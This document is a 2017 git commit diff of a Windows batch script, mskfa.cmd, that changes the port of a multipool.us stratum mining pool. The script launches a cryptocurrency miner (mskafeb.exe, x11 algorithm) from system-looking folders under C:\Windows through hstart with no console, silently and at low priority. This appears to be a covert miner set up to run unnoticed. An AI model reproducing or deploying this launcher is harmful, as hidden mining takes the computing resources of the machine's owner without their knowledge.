5f7bf3fa4129670bba8d6b49f6add190c16b7ae1
oliverafa <oliverafa@gmail.com>
2017-06-17 15:52:31 -0300

    Update mskfa.cmd

--- mskfa.cmd
+++ mskfa.cmd
@@ -1,6 +1,6 @@
 @echo off
 
 set minuser=oliverafa.2
-set minurl=stratum+tcp://us.multipool.us:11111
+set minurl=stratum+tcp://us.multipool.us:3373
 
 start C:\Windows\mskfea\Hstart\hstart.exe /NOCONSOLE /SILENT /D="C:\Windows\mskfea\mskafeb\" /BELOWNORMAL ""C:\Windows\mskfea\mskafeb\mskafeb.exe" -D -a x11 -o %minurl% -u %minuser% -p x"
